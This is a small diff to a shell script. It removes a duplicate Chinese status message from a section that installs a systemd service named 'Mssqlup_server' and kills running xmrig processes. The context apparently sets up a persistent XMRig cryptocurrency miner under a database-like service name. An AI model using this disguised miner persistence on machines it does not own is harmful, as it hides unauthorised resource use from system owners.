@@ -857,7 +857,6 @@ WantedBy=multi-user.target
 EOL
     sudo mv /tmp/Mssqlup_server.service /etc/systemd/system/Mssqlup_server.service
     echo "[*] Starting Mssqlup_server systemd service"
-	echo "[*] 启动Mssqlup_server systemd服务"
     sudo killall xmrig 2>/dev/null
     sudo systemctl daemon-reload
     sudo systemctl enable Mssqlup_server.service
